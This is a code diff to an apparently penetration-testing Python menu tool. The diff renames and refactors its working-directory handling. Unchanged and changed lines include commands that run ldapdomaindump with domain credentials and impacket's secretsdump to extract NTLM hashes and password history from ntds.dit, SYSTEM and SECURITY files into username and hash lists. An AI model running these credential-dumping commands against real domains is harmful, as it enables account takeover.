@@ -63,7 +63,7 @@ colour7 = "yellow"
 colour8 = "magenta"
 netWork = "tun0"						# LOCAL INTERFACE
 dataDir = "ROGUEAGENT"						# LOCAL DIRECTORY
-workDir = "DATA&FILES"
+workDir = "DATA-FILES"
 httpDir = "TREADSTONE"
 fileExt = "xlsx,docx,doc,txt,xml,bak,zip,php,html,pdf"		# FILE EXTENSIONS
 keyPath = "python3 /usr/share/doc/python3-impacket/examples/"	# PATH 2 IMPACKET
@@ -1137,24 +1137,24 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '12':
-      oldDirectory = DIR.rstrip(" ")     
-      newDirectory = input("[*] Please enter new WORK FOLDER: ").upper()
-      if os.path.exists(newDirectory):
-         print("[+] Directory already exists....")
-      else:
-         if len(newDirectory) > 0:
-            os.mkdir(newDirectory)
-            DIR = newDirectory            
-            DIR = spacePadding(DIR, COL1)
-            print("[+] Working directory changed...")
-            print("[*] Checking to see if the old directory can be safely deleted...")            
-            if len(os.listdir(oldDirectory)) == 0:
-               os.rmdir(oldDirectory)
-               print("[+] Old directory succesfully deleted...")
-            else:
-               print("[+] Old directory still contains data...")
-      prompt()
+#   if selection == '12':
+#      oldDirectory = workDir     
+#      newDirectory = input("[*] Please enter new WORK FOLDER: ").upper()
+#      if os.path.exists(newDirectory):
+#         print("[+] Directory already exists....")
+#      else:
+#         if len(newDirectory) > 0:
+#            os.mkdir(newDirectory)
+#            DIR = newDirectory            
+#            DIR = spacePadding(DIR, COL1)
+#            print("[+] Working directory changed...")
+#            print("[*] Checking to see if the old directory can be safely deleted...")            
+#            if len(os.listdir(oldDirectory)) == 0:
+#               os.rmdir(oldDirectory)
+#               print("[+] Old directory succesfully deleted...")
+#            else:
+#               print("[+] Old directory still contains data...")
+#      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2109,7 +2109,7 @@ while True:
          else:
             command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))            
          print("[*] Checking downloaded files: \n")
-         command("ls -la ./" + DIR.rstrip(" "))
+         command("ls -la ./" + workDir)
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -2296,26 +2296,26 @@ while True:
 
    if selection =='59':           
       print("[*] Checking " + workDir + " for relevant files...")
-      if os.path.exists("./" + DIR.rstrip(" ") + "/ntds.dit"):
+      if os.path.exists("./" + workDir + "/ntds.dit"):
          print("[+] File ntds.dit found...")
       else:
          print("[+] File ntds.dit not found...")
          checkParams = 1         
-      if os.path.exists("./" + DIR.rstrip(" ") + "/SYSTEM"):
+      if os.path.exists("./" + workDir + "/SYSTEM"):
          print("[+] File SYSTEM found...")
       else:
          print("[+] File SYSTEM not found...")
          checkParams = 1       
-      if os.path.exists("./" + DIR.rstrip(" ") + "/SECURITY"):
+      if os.path.exists("./" + workDir + "/SECURITY"):
          print("[+] File SECURITY found...")
       else:
          print("[+] File SECURITY not found")
          checkParams = 1                
       if checkParams != 1:
          print("[*] Extracting stored secrets, please wait...")
-         command(keyPath + "secretsdump.py -ntds ./" + DIR.rstrip(" ") + "/ntds.dit -system ./" + DIR.rstrip(" ") +  "/SYSTEM -security ./" + DIR.rstrip(" ") + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + DIR.rstrip(" ") +  "/ntlm-extract > log.tmp")      
-         command("cut -f1 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
-         command("cut -f4 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")         
+         command(keyPath + "secretsdump.py -ntds ./" + workDir + "/ntds.dit -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/ntlm-extract > log.tmp")      
+         command("cut -f1 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
+         command("cut -f4 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")         
          print("[+] Imported extracted secrets...")      
          with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2:
            for x in range (0, maxUser):
